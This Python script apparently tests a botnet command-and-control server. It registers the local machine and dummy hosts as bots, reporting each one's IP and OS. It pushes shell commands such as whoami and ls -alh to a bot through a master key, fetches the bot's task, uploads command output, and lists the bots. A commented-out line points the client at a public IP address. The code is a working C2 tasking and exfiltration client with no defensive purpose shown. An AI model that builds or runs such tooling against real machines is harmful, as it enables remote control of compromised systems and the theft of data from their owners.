import requests
import socket
import os 
import platform 

registerkey = "registerkey"

#URL = 'http://138.197.74.47:5000'
URL = 'http://localhost:5000'

def test_firstcontact():
    url = URL + '/firstcontact'
    data = {'firstcontactkey': 'firstcontact'}
    
    res = requests.post(url, data=data)

    print ("[+] Testing firstcontact... ")
    print (res.text + '\n')

def test_botpush(bot_id, cmd):
    url = URL + '/bot/' + bot_id + '/push'

    masterkey = 'masterkey'
    cmd = cmd

    data = { 'masterkey': masterkey, 'cmd': cmd }

    res = requests.post(url, data=data)

    print ("[+] Testing bot push command... ")
    print (res.text + '\n')

# God bless stackoverflow 
def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()

        return IP 

def test_register():
    url = URL + '/register'

    registerkey = "registerkey"
    hostname = socket.gethostname()
    #host_ip = socket.gethostbyname(hostname)
    host_ip = get_ip()

    if "Linux" in platform.platform():
        host_os = 'Nix'
    elif "Windows" in platform.platform():
        host_os = 'Windows'
    else:
        print("[-] Unidentifiable OS type")

    data = {'registerkey': registerkey, 'ip': host_ip, 'os': host_os}

    res = requests.post(url, data=data)

    print ("[+] Testing register... ")
    print (res.text + '\n')


def test_dummyregister(ip):
    url = URL + '/register'

    ip = ip
    os = 'Nix'

    data = {'registerkey': registerkey, 'ip': ip, 'os': os}

    res = requests.post(url, data=data)

    print("[+] Testing Register...")
    print(res.text)

def test_task(ip):
    url = URL + '/bot/' + ip + '/task'

    data = {'registerkey': registerkey}

    res = requests.post(url, data=data)

    print("[+] Grabbing task for ip: " + ip + "...")
    print("[+] Command: ", res.text)

def test_result(ip, result):
    url = URL + '/bot/' + ip + '/result'

    data = {'registerkey': registerkey, 'result': result}

    res = requests.post(url, data=data)

    print("[+] Uploading result to the server. ...")
    print(res.text)

def test_botlist():
    url = URL + '/bot/list'

    res = requests.get(url)

    print(res.text)

def main():
    test_firstcontact()

    #test_register()

    test_dummyregister('127.0.0.1')
    test_dummyregister('127.0.0.2')
    test_dummyregister('127.0.0.3')
    test_dummyregister('127.0.0.4')
    test_dummyregister('127.0.0.5')

    test_botpush('127.0.0.3', '1st: whoami')
    test_botpush('127.0.0.3', '2nd: ls -alh')
    test_botpush('127.0.0.3', '3rd: echo "lmao"')

    test_task('127.0.0.3')

    test_result('127.0.0.3', 'root')

    #test_botpush('127.0.0.3', '2nd: ls -alh')

    test_botlist()

if __name__ == '__main__':
    main() 